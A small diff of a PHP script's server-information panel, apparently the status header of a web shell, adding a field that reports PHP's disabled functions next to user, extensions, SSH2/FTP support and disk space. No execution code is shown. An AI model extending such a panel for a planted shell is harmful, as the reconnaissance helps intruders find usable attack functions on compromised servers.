@@ -145,7 +145,7 @@ echo( sprintf("
 		<tr><td>User</td><td>%s</td></tr>
 		<tr><td>Group</td><td>%s</td></tr>
 		<tr><td>System</td><td>%s</td></tr>
-		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b></td></tr>
+		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b></td></tr>
 		<tr><td>PHP Extensions</td><td>cURL: <b>%s</b> rar: <b>%s</b> zip: <b>%s</b> | MySQL/MariaDB: <b>%s</b> MongoDB: <b>%s</b> PostgreSQL: <b>%s</b> | SSH2: <b>%s</b> FTP: <b>%s</b></td></tr>
 		<tr><td>Current Directory</td><td>%s</td></tr>
 		<tr><td>Free / Total disk space</td><td>%sGB / %sGB</td></tr>
@@ -162,6 +162,7 @@ echo( sprintf("
 	((int) ini_get("SAFE_MODE")) ? "ON": "OFF",
 	(function_exists("get_magic_quotes_runtime") AND get_magic_quotes_runtime()) ? "ON" : "OFF",
 	error_reporting(),
+	ini_get("disable_functions") == "" ? "none" : ini_get("disable_functions"),
 	extension_loaded("curl") ? "ON" : "OFF",
 	extension_loaded("rar") ? "ON" : "OFF",
 	extension_loaded("zip") ? "ON" : "OFF",
